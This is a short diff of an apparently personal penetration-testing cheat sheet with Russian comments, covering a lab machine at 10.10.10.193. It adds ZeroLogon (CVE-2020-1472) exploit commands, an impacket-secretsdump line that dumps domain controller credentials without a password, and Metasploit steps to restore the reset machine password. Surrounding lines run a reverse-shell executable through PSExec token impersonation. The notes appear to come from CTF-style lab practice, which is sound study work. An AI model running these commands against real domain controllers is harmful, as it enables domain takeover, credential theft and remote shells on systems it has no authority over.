@@ -308,10 +308,20 @@ https://www.puckiestyle.nl/c-simple-reverse-shell/ ----> C:\windows\microsoft.ne
 
 # ZERO_LOGON
 
-python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уязвимость)
+    python3 cve-2020-1472-exploit.py fuse 10.10.10.193 (проверка на уязвимость)
 
-impacket-secretsdump -just-dc -no-pass fuse\$@10.10.10.193
+    impacket-secretsdump -just-dc -no-pass fuse\$@10.10.10.193
 
+    - восстановление пароля машины, после сброса
+        $ msfconsole
+    use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
+    set RHOSTS 192.168.0.17
+    set NBNAME DC1
+    Опции при этом останутся прежними, кроме двух новых: ACTION – выбора действия и PASSWORD – значения пароля машинного аккаунта в HEX:
+    set ACTION RESTORE
+    set PASSWORD <$MACHINE.ACC hex password>
+    run
+    
 # Токен имперсонейшн
 
 C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
